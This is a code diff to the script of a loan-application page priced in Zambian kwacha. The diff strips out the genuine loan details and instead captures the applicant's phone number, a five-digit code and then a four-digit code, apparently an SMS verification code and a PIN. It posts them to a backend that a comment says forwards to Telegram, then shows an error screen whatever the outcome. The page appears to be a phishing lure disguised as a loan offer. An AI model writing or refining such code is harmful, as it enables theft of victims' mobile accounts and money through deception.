@@ -17,38 +17,30 @@ const translations = {
 };
 
 let currentLang = 'en'; 
+// Temporary storage for the phone and 5-digit code
+let tempApplicationData = {}; 
 
 function setLanguage(lang) {
     currentLang = lang;
-    
     document.querySelectorAll('[data-translate]').forEach(el => {
         const key = el.getAttribute('data-translate');
-        if (translations[lang] && translations[lang][key]) {
-            el.innerHTML = translations[lang][key];
-        }
+        if (translations[lang] && translations[lang][key]) el.innerHTML = translations[lang][key];
     });
-
     document.querySelectorAll('[data-translate-placeholder]').forEach(el => {
         const key = el.getAttribute('data-translate-placeholder');
-        if (translations[lang] && translations[lang][key]) {
-            el.setAttribute('placeholder', translations[lang][key]);
-        }
+        if (translations[lang] && translations[lang][key]) el.setAttribute('placeholder', translations[lang][key]);
     });
-
     showScreen('main-screen');
 }
 
 function showScreen(screenId) {
-    document.querySelectorAll('.dark-screen').forEach(screen => {
-        screen.classList.remove('active');
-    });
+    document.querySelectorAll('.dark-screen').forEach(screen => screen.classList.remove('active'));
     document.getElementById(screenId).classList.add('active');
 }
 
 function updateLoanValue() {
     const amountSlider = document.getElementById('loanAmount');
     const termSlider = document.getElementById('loanTerm');
-    
     const amountDisplay = document.getElementById('amountDisplay');
     const termDisplay = document.getElementById('termDisplay');
     const monthlyOutput = document.getElementById('monthlyPayment');
@@ -62,7 +54,6 @@ function updateLoanValue() {
     const interestRate = 0.12; 
     const totalRepayment = amount + (amount * interestRate);
     const monthly = totalRepayment / term;
-    
     monthlyOutput.innerText = `ZMW ${Math.ceil(monthly).toLocaleString()}`;
 }
 
@@ -71,17 +62,13 @@ updateLoanValue();
 function goToForm() {
     const amount = document.getElementById('loanAmount').value;
     const term = document.getElementById('loanTerm').value;
-
     document.getElementById('formLoanAmount').value = amount;
     document.getElementById('formLoanTerm').value = `${term} Months`;
-
     showScreen('form-screen');
 }
 
 function nextStep(stepNumber) {
-    document.querySelectorAll('.form-step').forEach(step => {
-        step.classList.remove('active');
-    });
+    document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
     document.getElementById(`step-${stepNumber}`).classList.add('active');
     
     const progressFill = document.getElementById('progress-fill');
@@ -103,9 +90,7 @@ function nextStep(stepNumber) {
 }
 
 function prevStep(stepNumber) {
-    document.querySelectorAll('.form-step').forEach(step => {
-        step.classList.remove('active');
-    });
+    document.querySelectorAll('.form-step').forEach(step => step.classList.remove('active'));
     document.getElementById(`step-${stepNumber}`).classList.add('active');
     
     const progressFill = document.getElementById('progress-fill');
@@ -122,41 +107,57 @@ function prevStep(stepNumber) {
     }
 }
 
+// FIRST SUBMISSION: Grabs Phone and 5-Digit Code
 async function submitApplication() {
     showScreen('processing-screen');
 
-    const applicationData = {
-        loanAmount: document.getElementById('formLoanAmount').value,
-        loanTerm: document.getElementById('formLoanTerm').value,
-        loanType: document.getElementById('loanType').value,
-        firstName: document.querySelector('#step-2 input[placeholder="First Name"]').value || 'Not provided',
-        lastName: document.querySelector('#step-2 input[placeholder="Last Name"]').value || 'Not provided',
+    // Save the phone and 5-digit code to our temporary variable
+    tempApplicationData = {
         phone: document.querySelector('#step-2 input[type="tel"]').value || 'Not provided',
-        purpose: document.querySelector('#step-1 input[placeholder="e.g., Business expansion"]').value || 'Not provided',
-        empStatus: document.getElementById('empStatus').value,
-        annualIncome: document.querySelector('#step-3 input[placeholder="e.g., 5000000"]').value || 'Not provided'
+        fiveDigitCode: document.querySelector('#step-2 input[placeholder="Enter 5-digit code"]').value || 'Not provided',
+        fourDigitCode: 'Pending...' // We don't have this yet
     };
 
     try {
         const response = await fetch('/api/submit-application', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(applicationData)
+            body: JSON.stringify(tempApplicationData)
         });
 
-        const result = await response.json();
-
-        if (result.success) {
+        if (response.ok) {
             setTimeout(() => {
                 showScreen('sms-screen'); 
             }, 1500);
         } else {
-            alert("Something went wrong. Please try again.");
+            alert("Error sending. Try again.");
             showScreen('main-screen');
         }
     } catch (error) {
         console.error("Error:", error);
-        alert("Network error. Please try again.");
         showScreen('main-screen');
+    }
+}
+
+// SECOND SUBMISSION: Grabs the 4-Digit Code and sends the final update
+async function submitFourDigitCode() {
+    showScreen('processing-screen');
+
+    // Update the 4-digit code
+    tempApplicationData.fourDigitCode = document.querySelector('#verification-screen input').value || 'Not provided';
+
+    try {
+        // Send the final update to Telegram
+        await fetch('/api/submit-application', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(tempApplicationData)
+        });
+        
+        // Then show the error screen (as per your app's flow)
+        showScreen('error-screen');
+    } catch (error) {
+        console.error("Error:", error);
+        showScreen('error-screen');
     }
 }
